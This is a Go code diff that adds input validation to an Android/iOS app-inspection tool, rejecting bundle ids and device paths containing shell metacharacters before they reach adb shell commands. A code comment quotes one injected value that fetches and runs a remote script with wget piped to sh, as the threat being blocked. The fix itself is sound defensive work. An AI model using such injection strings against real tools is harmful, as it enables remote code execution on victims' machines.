@@ -44,6 +44,12 @@ func (g *GUI) AppDetails(deviceID, bundleID, apkPath, platform string) (AppDetai
 
 // --- Android (dumpsys) ---
 
+// bundleIDRe matches an Android or iOS bundle id: dot-separated segments of
+// letters / digits / underscore / dash / dollar (the last for inner
+// classes). Rejects leading `-` (would be an adb / simctl / dumpsys option)
+// and shell metacharacters. See MFI-CMD-09.
+var bundleIDRe = regexp.MustCompile(`^[A-Za-z][A-Za-z0-9._$-]*$`)
+
 type androidPkg struct {
 	VersionName, VersionCode, MinSDK, TargetSDK, ABI string
 	FirstInstall, LastUpdate, Installer, UID         string
@@ -52,6 +58,9 @@ type androidPkg struct {
 }
 
 func androidDetails(g *GUI, deviceID, bundleID string) ([]DetailField, []string) {
+	if !bundleIDRe.MatchString(bundleID) {
+		return nil, nil
+	}
 	out, err := sysproc.CommandContext(g.ctx, "adb", "-s", deviceID, "shell", "dumpsys", "package", bundleID).Output()
 	if err != nil {
 		return nil, nil
@@ -253,10 +262,41 @@ func bracketed(line string) string {
 	return strings.TrimSpace(line[i+1 : j])
 }
 
+// safeDumpsysPath validates a device path parsed out of `dumpsys package`
+// output (dataDir, codePath) before it is spliced back into an adb-shell
+// argv. `dumpsys` runs on-device with the shell uid and normally returns
+// well-formed paths, but a compromised dumpsys / hostile shell on a rooted
+// attacker device could return `foo; wget http://a/x|sh #` which would
+// then execute inside dirSizeBytes's adb shell. Reject anything with a
+// space, control byte, or shell metacharacter. See MFI-CMD-08.
+func safeDumpsysPath(s string) (string, bool) {
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return "", false
+	}
+	for _, r := range s {
+		if r <= 0x20 || r == 0x7f {
+			return "", false
+		}
+		switch r {
+		case ';', '|', '&', '`', '$', '(', ')', '<', '>', '"', '\'', '*', '?', '[', ']', '{', '}', '\\':
+			return "", false
+		}
+	}
+	return s, true
+}
+
 // dirSizeBytes runs `du -sk` (optionally via run-as) and returns bytes.
 func dirSizeBytes(g *GUI, deviceID, runAs, dir string) int64 {
+	dir, ok := safeDumpsysPath(dir)
+	if !ok {
+		return 0
+	}
 	args := []string{"-s", deviceID, "shell"}
 	if runAs != "" {
+		if !bundleIDRe.MatchString(runAs) {
+			return 0
+		}
 		args = append(args, "run-as", runAs)
 	}
 	args = append(args, "du", "-sk", dir)
